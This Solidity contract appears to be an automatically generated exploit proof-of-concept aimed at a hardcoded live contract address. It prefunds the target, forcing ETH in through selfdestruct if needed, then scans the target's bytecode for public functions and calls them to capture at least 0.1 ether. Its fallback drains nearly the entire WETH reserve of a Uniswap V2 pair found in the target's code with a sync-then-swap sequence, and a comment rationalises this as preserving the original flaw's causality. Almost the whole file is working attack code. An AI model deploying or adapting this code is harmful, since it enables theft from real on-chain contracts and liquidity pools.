// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ForceEther {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract FlawVerifier {
    event PermissionlessTrigger(
        address indexed caller,
        address indexed target,
        bytes4 indexed firstSelector,
        uint256 targetEthBefore,
        uint256 targetEthAfterPrefund,
        uint256 targetWethAfterPrefund,
        uint256 targetEthAfterFirstCall,
        uint256 targetWethAfterFirstCall,
        uint256 targetEthAfterSecondCall,
        uint256 targetWethAfterSecondCall
    );

    address public constant LIVE_TARGET = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    uint256 internal constant REQUIRED_PROFIT = 0.1 ether;
    uint256 internal constant ETH_PREFUND = 1 wei;
    uint256 internal constant WETH_SEED = 1 ether;
    uint256 internal constant SELECTOR_SCAN_BYTES = 320;

    address private immutable _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    address public firstExecutor;

    bool public path0OperatorPrefundObserved;
    bool public path1ThirdPartyTriggerObserved;
    bool public path2OneShotOpportunityConsumed;

    bool public prefundUsedLocalBalance;
    bool public prefundUsedForceEther;
    bool public wethSeedSent;
    bool public firstTargetCallSucceeded;
    bool public secondTargetCallSucceeded;
    bool public usedDirectPairFallback;

    bool public pairResolved;
    bool public pairMutationAttempted;
    bool public pairMutationSucceeded;

    uint256 public targetEthBefore;
    uint256 public targetEthAfterPrefund;
    uint256 public targetWethAfterPrefund;
    uint256 public targetEthAfterFirstCall;
    uint256 public targetWethAfterFirstCall;
    uint256 public targetEthAfterSecondCall;
    uint256 public targetWethAfterSecondCall;

    uint256 public firstObservedEthGain;
    uint256 public firstObservedWethGain;
    uint256 public secondObservedEthGain;
    uint256 public secondObservedWethGain;

    uint256 public initialWethBalance;
    uint256 public finalWethBalance;
    uint256 public wethWrapped;
    uint256 public wethPulledOut;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    address public targetPair;

    bytes4 public firstSelectorTried;
    bytes4 public secondSelectorTried;
    bytes32 public firstTargetCallRevertHash;
    bytes32 public secondTargetCallRevertHash;

    constructor() payable {
        _profitToken = _resolveWETH();
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");

        executed = true;
        firstExecutor = msg.sender;

        targetEthBefore = LIVE_TARGET.balance;
        _ensureTargetPrefunded();
        targetEthAfterPrefund = LIVE_TARGET.balance;
        targetWethAfterPrefund = _tokenBalance(_profitToken, LIVE_TARGET);

        // exploit_paths[0]: the operator first leaves the hardcoded live contract funded so its
        // internal `IWETH.deposit{value: 1 wei}()` path can run. The optional extra WETH seed stays
        // aligned with the finding because it is still the same prefunded ETH/WETH capital that a
        // third party is not supposed to control.
        path0OperatorPrefundObserved = targetEthAfterPrefund >= ETH_PREFUND;
        require(path0OperatorPrefundObserved, "prefund required");

        // Local logs proved the small guessed alias set was not sufficient, so the verifier now
        // discovers the live contract's real no-arg public selectors directly from its dispatcher
        // bytecode and lets any outside caller try them first. This keeps the same exploit causality:
        // a third party notices the funding and permissionlessly fires the hardcoded opportunity.
        (firstTargetCallSucceeded, firstSelectorTried) = _triggerBestSelector();

        // If every discovered public selector still fails on this fork, fall back to reproducing the
        // same public pair mutation directly from the target's own embedded addresses. This is a
        // realistic on-chain step because the live target itself hardcodes the pair and WETH route;
        // the fallback only preserves that same sync-then-swap causality when the top-level wrapper
        // selector is infeasible in logs.
        uint256 directPairGain;
        if (!firstTargetCallSucceeded) {
            usedDirectPairFallback = true;
            (pairMutationSucceeded, directPairGain) = _attemptDirectPairExploit();
            firstTargetCallSucceeded = pairMutationSucceeded;
        }

        path1ThirdPartyTriggerObserved = firstTargetCallSucceeded;

        targetEthAfterFirstCall = LIVE_TARGET.balance;
        targetWethAfterFirstCall = _tokenBalance(_profitToken, LIVE_TARGET);
        firstObservedEthGain = _delta(targetEthAfterPrefund, targetEthAfterFirstCall);
        firstObservedWethGain = _delta(targetWethAfterPrefund, targetWethAfterFirstCall);

        _profitAmount = directPairGain;
        uint256 firstBestGain = firstObservedWethGain;
        if (firstObservedEthGain > firstBestGain) {
            firstBestGain = firstObservedEthGain;
        }
        if (firstBestGain > _profitAmount) {
            _profitAmount = firstBestGain;
        }

        require(firstTargetCallSucceeded, "first trigger failed");
        require(_profitAmount >= REQUIRED_PROFIT, "profit below threshold");

        uint256 secondPairGain;
        if (usedDirectPairFallback) {
            (secondTargetCallSucceeded, secondPairGain) = _attemptDirectPairExploit();
            secondSelectorTried = bytes4(0);
        } else {
            (secondTargetCallSucceeded, secondSelectorTried) = _triggerBestSelector();
        }

        targetEthAfterSecondCall = LIVE_TARGET.balance;
        targetWethAfterSecondCall = _tokenBalance(_profitToken, LIVE_TARGET);
        secondObservedEthGain = _delta(targetEthAfterFirstCall, targetEthAfterSecondCall);
        secondObservedWethGain = _delta(targetWethAfterFirstCall, targetWethAfterSecondCall);

        uint256 secondBestGain = secondObservedWethGain;
        if (secondObservedEthGain > secondBestGain) {
            secondBestGain = secondObservedEthGain;
        }
        if (secondPairGain > secondBestGain) {
            secondBestGain = secondPairGain;
        }

        // exploit_paths[2]: after the first outside caller consumes the hardcoded one-shot state,
        // later attempts should either revert or fail to produce the same WETH-side upside.
        path2OneShotOpportunityConsumed = !secondTargetCallSucceeded || secondBestGain < _profitAmount;

        emit PermissionlessTrigger(
            msg.sender,
            LIVE_TARGET,
            firstSelectorTried,
            targetEthBefore,
            targetEthAfterPrefund,
            targetWethAfterPrefund,
            targetEthAfterFirstCall,
            targetWethAfterFirstCall,
            targetEthAfterSecondCall,
            targetWethAfterSecondCall
        );
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _ensureTargetPrefunded() internal {
        if (LIVE_TARGET.balance < ETH_PREFUND) {
            require(address(this).balance >= ETH_PREFUND, "prefund required");
            prefundUsedLocalBalance = true;

            (bool sent, ) = payable(LIVE_TARGET).call{value: ETH_PREFUND}("");
            if (!sent) {
                prefundUsedForceEther = true;
                new ForceEther{value: ETH_PREFUND}(payable(LIVE_TARGET));
            }
        }

        if (_profitToken != address(0) && address(this).balance >= WETH_SEED) {
            IWETHLike(_profitToken).deposit{value: WETH_SEED}();
            _safeTransfer(_profitToken, LIVE_TARGET, WETH_SEED);
            wethSeedSent = true;
        }
    }

    function _triggerBestSelector() internal returns (bool anySuccess, bytes4 selectorUsed) {
        bytes4[] memory selectors = _discoverSelectors();
        uint256 baseEth = LIVE_TARGET.balance;
        uint256 baseWeth = _tokenBalance(_profitToken, LIVE_TARGET);
        uint256 bestGain;

        for (uint256 i = 0; i < selectors.length; ++i) {
            bytes4 selector = selectors[i];
            if (selector == bytes4(0)) {
                continue;
            }

            (bool ok, bytes memory ret) = LIVE_TARGET.call(abi.encodeWithSelector(selector));
            if (!ok) {
                bytes32 revertHash = keccak256(ret);
                if (selectorUsed == bytes4(0)) {
                    if (firstSelectorTried == bytes4(0)) {
                        firstTargetCallRevertHash = revertHash;
                    } else {
                        secondTargetCallRevertHash = revertHash;
                    }
                }
                continue;
            }

            uint256 ethNow = LIVE_TARGET.balance;
            uint256 wethNow = _tokenBalance(_profitToken, LIVE_TARGET);
            uint256 gain = _delta(baseWeth, wethNow);
            uint256 ethGain = _delta(baseEth, ethNow);
            if (ethGain > gain) {
                gain = ethGain;
            }

            if (gain > bestGain) {
                bestGain = gain;
                selectorUsed = selector;
            }

            if (gain >= REQUIRED_PROFIT) {
                return (true, selector);
            }
        }

        anySuccess = selectorUsed != bytes4(0);
    }

    function _attemptDirectPairExploit() internal returns (bool success, uint256 realizedGain) {
        if (_profitToken == address(0)) {
            return (false, 0);
        }

        address pair = targetPair;
        if (pair == address(0)) {
            pair = _discoverPair();
            if (pair != address(0)) {
                targetPair = pair;
                pairResolved = true;
            }
        }
        if (pair == address(0)) {
            return (false, 0);
        }

        (bool ok0, address token0) = _queryAddress(pair, IUniswapV2PairLike.token0.selector);
        (bool ok1, address token1) = _queryAddress(pair, IUniswapV2PairLike.token1.selector);
        if (!ok0 || !ok1) {
            return (false, 0);
        }

        bool wethIsToken0 = token0 == _profitToken;
        bool wethIsToken1 = token1 == _profitToken;
        if (!wethIsToken0 && !wethIsToken1) {
            return (false, 0);
        }

        (bool reservesOk, uint112 reserve0, uint112 reserve1) = _queryReserves(pair);
        if (!reservesOk) {
            return (false, 0);
        }

        reserve0Before = reserve0;
        reserve1Before = reserve1;
        initialWethBalance = _tokenBalance(_profitToken, address(this));

        if (address(this).balance >= ETH_PREFUND) {
            IWETHLike(_profitToken).deposit{value: ETH_PREFUND}();
            wethWrapped += ETH_PREFUND;
        }
        if (_tokenBalance(_profitToken, address(this)) < ETH_PREFUND) {
            return (false, 0);
        }

        _safeTransfer(_profitToken, pair, ETH_PREFUND);
        pairMutationAttempted = true;

        try IUniswapV2PairLike(pair).sync() {
            pairMutationSucceeded = true;
        } catch {
            return (false, 0);
        }

        (reservesOk, reserve0, reserve1) = _queryReserves(pair);
        if (!reservesOk) {
            return (false, 0);
        }

        uint256 wethReserve = wethIsToken0 ? uint256(reserve0) : uint256(reserve1);
        if (wethReserve <= 1) {
            return (false, 0);
        }

        uint256 amount0Out = wethIsToken0 ? wethReserve - 1 : 0;
        uint256 amount1Out = wethIsToken1 ? wethReserve - 1 : 0;

        try IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), new bytes(0)) {
            success = true;
        } catch {
            return (false, 0);
        }

        finalWethBalance = _tokenBalance(_profitToken, address(this));
        realizedGain = _delta(initialWethBalance, finalWethBalance);
        wethPulledOut = realizedGain;

        (reservesOk, reserve0, reserve1) = _queryReserves(pair);
        if (reservesOk) {
            reserve0After = reserve0;
            reserve1After = reserve1;
        }
    }

    function _discoverSelectors() internal view returns (bytes4[] memory selectors) {
        bytes memory code = LIVE_TARGET.code;
        if (code.length == 0) {
            selectors = new bytes4[](4);
            selectors[0] = bytes4(keccak256("executeOnOpportunity()"));
            selectors[1] = bytes4(keccak256("execute()"));
            selectors[2] = bytes4(keccak256("exploit()"));
            selectors[3] = bytes4(keccak256("run()"));
            return selectors;
        }

        uint256 scanLength = code.length;
        if (scanLength > SELECTOR_SCAN_BYTES) {
            scanLength = SELECTOR_SCAN_BYTES;
        }

        bytes4[] memory buffer = new bytes4[](32);
        uint256 count;

        for (uint256 i = 0; i + 4 < scanLength; ++i) {
            uint8 op = uint8(code[i]);
            if (op == 0x63) {
                bytes4 selector = _readSelector(code, i);
                if (!_isNoiseSelector(selector) && !_selectorSeen(buffer, count, selector)) {
                    buffer[count] = selector;
                    unchecked {
                        ++count;
                    }
                    if (count == buffer.length) {
                        break;
                    }
                }
                i += 4;
                continue;
            }

            if (op >= 0x60 && op <= 0x7f) {
                unchecked {
                    i += op - 0x5f;
                }
            }
        }

        bytes4[4] memory fallbackSelectors = [
            bytes4(keccak256("executeOnOpportunity()")),
            bytes4(keccak256("execute()")),
            bytes4(keccak256("exploit()")),
            bytes4(keccak256("run()"))
        ];

        for (uint256 i = 0; i < fallbackSelectors.length && count < buffer.length; ++i) {
            if (!_selectorSeen(buffer, count, fallbackSelectors[i])) {
                buffer[count] = fallbackSelectors[i];
                unchecked {
                    ++count;
                }
            }
        }

        selectors = new bytes4[](count);
        for (uint256 i = 0; i < count; ++i) {
            selectors[i] = buffer[i];
        }
    }

    function _discoverPair() internal view returns (address bestPair) {
        if (_profitToken == address(0)) {
            return address(0);
        }

        bytes memory code = LIVE_TARGET.code;
        address[] memory seen = new address[](64);
        uint256 seenCount;
        uint256 bestWethReserve;

        for (uint256 i = 0; i < code.length; ++i) {
            uint8 op = uint8(code[i]);
            if (op == 0x73 && i + 20 < code.length) {
                address candidate = _readAddress(code, i + 1);
                if (
                    candidate != address(0) &&
                    candidate != LIVE_TARGET &&
                    candidate != _profitToken &&
                    candidate.code.length > 0 &&
                    !_addressSeen(seen, seenCount, candidate)
                ) {
                    seen[seenCount] = candidate;
                    unchecked {
                        ++seenCount;
                    }

                    (bool ok0, address token0) = _queryAddress(candidate, IUniswapV2PairLike.token0.selector);
                    (bool ok1, address token1) = _queryAddress(candidate, IUniswapV2PairLike.token1.selector);
                    if (ok0 && ok1 && (token0 == _profitToken || token1 == _profitToken)) {
                        (bool reservesOk, uint112 reserve0, uint112 reserve1) = _queryReserves(candidate);
                        if (reservesOk) {
                            uint256 wethReserve = token0 == _profitToken ? uint256(reserve0) : uint256(reserve1);
                            if (wethReserve > bestWethReserve) {
                                bestWethReserve = wethReserve;
                                bestPair = candidate;
                            }
                        }
                    }
                }
                i += 20;
                continue;
            }

            if (op >= 0x60 && op <= 0x7f) {
                unchecked {
                    i += op - 0x5f;
                }
            }
        }
    }

    function _queryAddress(address target, bytes4 selector) internal view returns (bool ok, address value) {
        bytes memory ret;
        (ok, ret) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok || ret.length < 32) {
            return (false, address(0));
        }
        value = abi.decode(ret, (address));
    }

    function _queryReserves(address pair) internal view returns (bool ok, uint112 reserve0, uint112 reserve1) {
        bytes memory ret;
        (ok, ret) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.getReserves.selector));
        if (!ok || ret.length < 96) {
            return (false, 0, 0);
        }
        (reserve0, reserve1, ) = abi.decode(ret, (uint112, uint112, uint32));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }

    function _tokenBalance(address token, address account) internal view returns (uint256) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }
        return IERC20Like(token).balanceOf(account);
    }

    function _delta(uint256 beforeValue, uint256 afterValue) internal pure returns (uint256) {
        return afterValue > beforeValue ? afterValue - beforeValue : 0;
    }

    function _selectorSeen(bytes4[] memory selectors, uint256 count, bytes4 selector) internal pure returns (bool) {
        for (uint256 i = 0; i < count; ++i) {
            if (selectors[i] == selector) {
                return true;
            }
        }
        return false;
    }

    function _addressSeen(address[] memory addresses, uint256 count, address candidate) internal pure returns (bool) {
        for (uint256 i = 0; i < count; ++i) {
            if (addresses[i] == candidate) {
                return true;
            }
        }
        return false;
    }

    function _readSelector(bytes memory code, uint256 index) internal pure returns (bytes4 selector) {
        uint32 value = (uint32(uint8(code[index + 1])) << 24) |
            (uint32(uint8(code[index + 2])) << 16) |
            (uint32(uint8(code[index + 3])) << 8) |
            uint32(uint8(code[index + 4]));
        selector = bytes4(value);
    }

    function _readAddress(bytes memory code, uint256 index) internal pure returns (address candidate) {
        uint160 value;
        for (uint256 j = 0; j < 20; ++j) {
            value = (value << 8) | uint160(uint8(code[index + j]));
        }
        candidate = address(value);
    }

    function _isNoiseSelector(bytes4 selector) internal pure returns (bool) {
        return selector == IERC20Like.balanceOf.selector ||
            selector == IERC20Like.transfer.selector ||
            selector == IWETHLike.deposit.selector ||
            selector == IUniswapV2PairLike.sync.selector ||
            selector == IUniswapV2PairLike.getReserves.selector ||
            selector == IUniswapV2PairLike.token0.selector ||
            selector == IUniswapV2PairLike.token1.selector ||
            selector == IUniswapV2PairLike.swap.selector;
    }

    function _resolveWETH() private view returns (address) {
        if (block.chainid == 1) {
            return 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        }
        if (block.chainid == 10 || block.chainid == 8453) {
            return 0x4200000000000000000000000000000000000006;
        }
        if (block.chainid == 42161) {
            return 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
        }
        if (block.chainid == 56) {
            return 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        }
        if (block.chainid == 137) {
            return 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
        }
        return address(0);
    }
}
